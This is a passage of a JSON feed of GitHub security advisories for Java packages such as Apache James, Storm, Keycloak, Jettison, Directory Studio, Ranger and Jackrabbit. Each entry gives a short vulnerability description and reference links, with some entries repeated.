            ]
        },
        {
            "content_html": "<p>Apache James Server 2.3.2, when configured with file-based user repositories, allows attackers to execute arbitrary system commands via unspecified vectors.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-7611\">https://nvd.nist.gov/vuln/detail/CVE-2015-7611</a></li>\n<li><a href=\"https://blogs.apache.org/james/entry/apache_james_server_2_3\">https://blogs.apache.org/james/entry/apache_james_server_2_3</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/133798/Apache-James-Server-2.3.2-Arbitrary-Command-Execution.html\">http://packetstormsecurity.com/files/133798/Apache-James-Server-2.3.2-Arbitrary-Command-Execution.html</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/156463/Apache-James-Server-2.3.2-Insecure-User-Creation-Arbitrary-File-Write.html\">http://packetstormsecurity.com/files/156463/Apache-James-Server-2.3.2-Insecure-User-Creation-Arbitrary-File-Write.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2015/09/30/7\">http://www.openwall.com/lists/oss-security/2015/09/30/7</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2015/10/01/2\">http://www.openwall.com/lists/oss-security/2015/10/01/2</a></li>\n<li><a href=\"https://web.archive.org/web/20201207092339/http://www.securityfocus.com/archive/1/536575/100/0/threaded\">https://web.archive.org/web/20201207092339/http://www.securityfocus.com/archive/1/536575/100/0/threaded</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cgvf-22vv-83h5\">https://github.com/advisories/GHSA-cgvf-22vv-83h5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cgvf-22vv-83h5",
            "title": "[org.apache.james:james-server] Apache James Server OS Command Injection",
            "date_modified": "2023-08-02T21:03:02.000Z",
            "date_published": "2022-05-14T02:47:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cgvf-22vv-83h5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The UI daemon in Apache Storm 0.10.0-beta allows remote users to run arbitrary code as the user running the web server. With kerberos authentication this could allow impersonation of arbitrary users on other systems, including HDFS and HBase.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-3188\">https://nvd.nist.gov/vuln/detail/CVE-2015-3188</a></li>\n<li><a href=\"http://packetstormsecurity.com/files/132417/Apache-Storm-0.10.0-beta-Code-Execution.html\">http://packetstormsecurity.com/files/132417/Apache-Storm-0.10.0-beta-Code-Execution.html</a></li>\n<li><a href=\"https://github.com/apache/storm/blob/v0.10.0-beta1/SECURITY.md\">https://github.com/apache/storm/blob/v0.10.0-beta1/SECURITY.md</a></li>\n<li><a href=\"https://github.com/apache/storm/blob/v0.10.0-beta1/STORM-UI-REST-API.md\">https://github.com/apache/storm/blob/v0.10.0-beta1/STORM-UI-REST-API.md</a></li>\n<li><a href=\"https://web.archive.org/web/20151014213052/http://www.securitytracker.com/id/1032695\">https://web.archive.org/web/20151014213052/http://www.securitytracker.com/id/1032695</a></li>\n<li><a href=\"https://web.archive.org/web/20171202122914/http://www.securityfocus.com/archive/1/535804/100/0/threaded\">https://web.archive.org/web/20171202122914/http://www.securityfocus.com/archive/1/535804/100/0/threaded</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cg5h-q983-4rww\">https://github.com/advisories/GHSA-cg5h-q983-4rww</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cg5h-q983-4rww",
            "title": "[org.apache.storm:storm] Apache Storm remote code execution vulnerability",
            "date_modified": "2023-08-02T21:01:27.000Z",
            "date_published": "2022-05-14T02:48:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cg5h-q983-4rww"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in the Keycloak REST API before version 8.0.0, implemented in Keycloak before 7.0.1 where it would permit user access from a realm the user was not configured. An authenticated attacker with knowledge of a user id could use this flaw to access unauthorized information or to carry out further attacks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-14832\">https://nvd.nist.gov/vuln/detail/CVE-2019-14832</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14832\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14832</a></li>\n<li><a href=\"https://github.com/keycloak/keycloak/commit/0b73685ccf3181115ae3936a578708630215ac23\">https://github.com/keycloak/keycloak/commit/0b73685ccf3181115ae3936a578708630215ac23</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8prc-58j4-m55q\">https://github.com/advisories/GHSA-8prc-58j4-m55q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8prc-58j4-m55q",
            "title": "[org.keycloak:keycloak-model-jpa] Keycloak Unauthenticated Access",
            "date_modified": "2023-08-01T22:43:20.000Z",
            "date_published": "2022-05-24T16:58:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8prc-58j4-m55q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A flaw was found in the Keycloak REST API before version 8.0.0, implemented in Keycloak before 7.0.1 where it would permit user access from a realm the user was not configured. An authenticated attacker with knowledge of a user id could use this flaw to access unauthorized information or to carry out further attacks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-14832\">https://nvd.nist.gov/vuln/detail/CVE-2019-14832</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14832\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-14832</a></li>\n<li><a href=\"https://github.com/keycloak/keycloak/commit/0b73685ccf3181115ae3936a578708630215ac23\">https://github.com/keycloak/keycloak/commit/0b73685ccf3181115ae3936a578708630215ac23</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8prc-58j4-m55q\">https://github.com/advisories/GHSA-8prc-58j4-m55q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8prc-58j4-m55q",
            "title": "[org.keycloak:keycloak-model-infinispan] Keycloak Unauthenticated Access",
            "date_modified": "2023-08-01T22:43:20.000Z",
            "date_published": "2022-05-24T16:58:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8prc-58j4-m55q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Those using Jettison to parse untrusted XML or JSON data may be vulnerable to Denial of Service attacks (DOS). If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-40149\">https://nvd.nist.gov/vuln/detail/CVE-2022-40149</a></li>\n<li><a href=\"https://github.com/jettison-json/jettison/issues/45\">https://github.com/jettison-json/jettison/issues/45</a></li>\n<li><a href=\"https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=46538\">https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=46538</a></li>\n<li><a href=\"https://github.com/jettison-json/jettison/pull/49/files\">https://github.com/jettison-json/jettison/pull/49/files</a></li>\n<li><a href=\"https://github.com/jettison-json/jettison/releases/tag/jettison-1.5.1\">https://github.com/jettison-json/jettison/releases/tag/jettison-1.5.1</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/11/msg00011.html\">https://lists.debian.org/debian-lts-announce/2022/11/msg00011.html</a></li>\n<li><a href=\"https://www.debian.org/security/2023/dsa-5312\">https://www.debian.org/security/2023/dsa-5312</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tencyle-fixes/jettison/security/advisories/GHSA-xqcq-j8w9-3pxv\">https://github.com/tencyle-fixes/jettison/security/advisories/GHSA-xqcq-j8w9-3pxv</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-40149\">https://nvd.nist.gov/vuln/detail/CVE-2022-40149</a></li>\n<li><a href=\"https://github.com/jettison-json/jettison/issues/45\">https://github.com/jettison-json/jettison/issues/45</a></li>\n<li><a href=\"https://github.com/jettison-json/jettison/pull/49\">https://github.com/jettison-json/jettison/pull/49</a></li>\n<li><a href=\"https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=46538\">https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=46538</a></li>\n<li><a href=\"https://github.com/jettison-json/jettison/releases/tag/jettison-1.5.1\">https://github.com/jettison-json/jettison/releases/tag/jettison-1.5.1</a></li>\n<li><a href=\"https://github.com/tencyle-fixes/jettison#jettison-backports-repository-by-tencyle\">https://github.com/tencyle-fixes/jettison#jettison-backports-repository-by-tencyle</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2022/11/msg00011.html\">https://lists.debian.org/debian-lts-announce/2022/11/msg00011.html</a></li>\n<li><a href=\"https://www.debian.org/security/2023/dsa-5312\">https://www.debian.org/security/2023/dsa-5312</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xqcq-j8w9-3pxv\">https://github.com/advisories/GHSA-xqcq-j8w9-3pxv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xqcq-j8w9-3pxv",
            "title": "[com.tencyle.fixes:org.codehaus.jettison--jettison] Jettison parser crash by stackoverflow",
            "date_modified": "2023-08-01T19:53:17.000Z",
            "date_published": "2023-08-01T19:53:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xqcq-j8w9-3pxv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The CSV export in Apache LDAP Studio and Apache Directory Studio before 2.0.0-M10 does not properly escape field values, which might allow attackers to execute arbitrary commands by leveraging a crafted LDAP entry that is interpreted as a formula when imported into a spreadsheet.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-5349\">https://nvd.nist.gov/vuln/detail/CVE-2015-5349</a></li>\n<li><a href=\"https://directory.apache.org/studio/news.html\">https://directory.apache.org/studio/news.html</a></li>\n<li><a href=\"https://lists.apache.org/thread.html/reb5443aaf781b364896ee9d7cf6e97fdc4f5a5174132c319252963b6@%3Ccommits.directory.apache.org%3E\">https://lists.apache.org/thread.html/reb5443aaf781b364896ee9d7cf6e97fdc4f5a5174132c319252963b6@%3Ccommits.directory.apache.org%3E</a></li>\n<li><a href=\"http://www.securityfocus.com/archive/1/537225/100/0/threaded\">http://www.securityfocus.com/archive/1/537225/100/0/threaded</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p9qj-4rjp-j3w9\">https://github.com/advisories/GHSA-p9qj-4rjp-j3w9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p9qj-4rjp-j3w9",
            "title": "[org.apache.directory.studio:org.apache.directory.studio.parent] Apache Directory Studio Command Injection",
            "date_modified": "2023-08-01T00:05:07.000Z",
            "date_published": "2022-05-13T01:07:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p9qj-4rjp-j3w9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Apache Ranger 0.5.x before 0.5.2 allows remote authenticated users to bypass intended parent resource-level access restrictions by leveraging mishandling of a resource-level exclude policy.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-0735\">https://nvd.nist.gov/vuln/detail/CVE-2016-0735</a></li>\n<li><a href=\"http://mail-archives.apache.org/mod_mbox/ranger-dev/201603.mbox/%3CD31EE434.14B879%25vel%40apache.org%3E\">http://mail-archives.apache.org/mod_mbox/ranger-dev/201603.mbox/%3CD31EE434.14B879%25vel%40apache.org%3E</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-22v7-w6c5-v4rr\">https://github.com/advisories/GHSA-22v7-w6c5-v4rr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-22v7-w6c5-v4rr",
            "title": "[org.apache.ranger:ranger] Apache Ranger Access Restriction Bypass",
            "date_modified": "2023-07-31T22:56:15.000Z",
            "date_published": "2022-05-17T03:56:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-22v7-w6c5-v4rr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site request forgery (CSRF) vulnerability in the CSRF content-type check in Jackrabbit-Webdav in Apache Jackrabbit 2.4.x before 2.4.6, 2.6.x before 2.6.6, 2.8.x before 2.8.3, 2.10.x before 2.10.4, 2.12.x before 2.12.4, and 2.13.x before 2.13.3 allows remote attackers to hijack the authentication of unspecified victims for requests that create a resource via an HTTP POST request with a (1) missing or (2) crafted Content-Type header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6801\">https://nvd.nist.gov/vuln/detail/CVE-2016-6801</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/JCR-4009\">https://issues.apache.org/jira/browse/JCR-4009</a></li>\n<li><a href=\"http://www.debian.org/security/2016/dsa-3679\">http://www.debian.org/security/2016/dsa-3679</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/09/14/6\">http://www.openwall.com/lists/oss-security/2016/09/14/6</a></li>\n<li><a href=\"https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966\">https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fc7-rhq3-wm7x\">https://github.com/advisories/GHSA-9fc7-rhq3-wm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x",
            "title": "[org.apache.jackrabbit:jackrabbit-parent] Apache Jackrabbit Authentication Hijacking Vulnerability",
            "date_modified": "2023-07-31T22:54:04.000Z",
            "date_published": "2022-05-17T03:48:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site request forgery (CSRF) vulnerability in the CSRF content-type check in Jackrabbit-Webdav in Apache Jackrabbit 2.4.x before 2.4.6, 2.6.x before 2.6.6, 2.8.x before 2.8.3, 2.10.x before 2.10.4, 2.12.x before 2.12.4, and 2.13.x before 2.13.3 allows remote attackers to hijack the authentication of unspecified victims for requests that create a resource via an HTTP POST request with a (1) missing or (2) crafted Content-Type header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6801\">https://nvd.nist.gov/vuln/detail/CVE-2016-6801</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/JCR-4009\">https://issues.apache.org/jira/browse/JCR-4009</a></li>\n<li><a href=\"http://www.debian.org/security/2016/dsa-3679\">http://www.debian.org/security/2016/dsa-3679</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/09/14/6\">http://www.openwall.com/lists/oss-security/2016/09/14/6</a></li>\n<li><a href=\"https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966\">https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fc7-rhq3-wm7x\">https://github.com/advisories/GHSA-9fc7-rhq3-wm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x",
            "title": "[org.apache.jackrabbit:jackrabbit-parent] Apache Jackrabbit Authentication Hijacking Vulnerability",
            "date_modified": "2023-07-31T22:54:04.000Z",
            "date_published": "2022-05-17T03:48:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site request forgery (CSRF) vulnerability in the CSRF content-type check in Jackrabbit-Webdav in Apache Jackrabbit 2.4.x before 2.4.6, 2.6.x before 2.6.6, 2.8.x before 2.8.3, 2.10.x before 2.10.4, 2.12.x before 2.12.4, and 2.13.x before 2.13.3 allows remote attackers to hijack the authentication of unspecified victims for requests that create a resource via an HTTP POST request with a (1) missing or (2) crafted Content-Type header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6801\">https://nvd.nist.gov/vuln/detail/CVE-2016-6801</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/JCR-4009\">https://issues.apache.org/jira/browse/JCR-4009</a></li>\n<li><a href=\"http://www.debian.org/security/2016/dsa-3679\">http://www.debian.org/security/2016/dsa-3679</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/09/14/6\">http://www.openwall.com/lists/oss-security/2016/09/14/6</a></li>\n<li><a href=\"https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966\">https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fc7-rhq3-wm7x\">https://github.com/advisories/GHSA-9fc7-rhq3-wm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x",
            "title": "[org.apache.jackrabbit:jackrabbit-parent] Apache Jackrabbit Authentication Hijacking Vulnerability",
            "date_modified": "2023-07-31T22:54:04.000Z",
            "date_published": "2022-05-17T03:48:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site request forgery (CSRF) vulnerability in the CSRF content-type check in Jackrabbit-Webdav in Apache Jackrabbit 2.4.x before 2.4.6, 2.6.x before 2.6.6, 2.8.x before 2.8.3, 2.10.x before 2.10.4, 2.12.x before 2.12.4, and 2.13.x before 2.13.3 allows remote attackers to hijack the authentication of unspecified victims for requests that create a resource via an HTTP POST request with a (1) missing or (2) crafted Content-Type header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6801\">https://nvd.nist.gov/vuln/detail/CVE-2016-6801</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/JCR-4009\">https://issues.apache.org/jira/browse/JCR-4009</a></li>\n<li><a href=\"http://www.debian.org/security/2016/dsa-3679\">http://www.debian.org/security/2016/dsa-3679</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/09/14/6\">http://www.openwall.com/lists/oss-security/2016/09/14/6</a></li>\n<li><a href=\"https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966\">https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fc7-rhq3-wm7x\">https://github.com/advisories/GHSA-9fc7-rhq3-wm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x",
            "title": "[org.apache.jackrabbit:jackrabbit-parent] Apache Jackrabbit Authentication Hijacking Vulnerability",
            "date_modified": "2023-07-31T22:54:04.000Z",
            "date_published": "2022-05-17T03:48:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site request forgery (CSRF) vulnerability in the CSRF content-type check in Jackrabbit-Webdav in Apache Jackrabbit 2.4.x before 2.4.6, 2.6.x before 2.6.6, 2.8.x before 2.8.3, 2.10.x before 2.10.4, 2.12.x before 2.12.4, and 2.13.x before 2.13.3 allows remote attackers to hijack the authentication of unspecified victims for requests that create a resource via an HTTP POST request with a (1) missing or (2) crafted Content-Type header.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6801\">https://nvd.nist.gov/vuln/detail/CVE-2016-6801</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/JCR-4009\">https://issues.apache.org/jira/browse/JCR-4009</a></li>\n<li><a href=\"http://www.debian.org/security/2016/dsa-3679\">http://www.debian.org/security/2016/dsa-3679</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2016/09/14/6\">http://www.openwall.com/lists/oss-security/2016/09/14/6</a></li>\n<li><a href=\"https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966\">https://web.archive.org/web/20210123170657/http://www.securityfocus.com/bid/92966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9fc7-rhq3-wm7x\">https://github.com/advisories/GHSA-9fc7-rhq3-wm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x",
            "title": "[org.apache.jackrabbit:jackrabbit-parent] Apache Jackrabbit Authentication Hijacking Vulnerability",
            "date_modified": "2023-07-31T22:54:04.000Z",
            "date_published": "2022-05-17T03:48:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9fc7-rhq3-wm7x"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}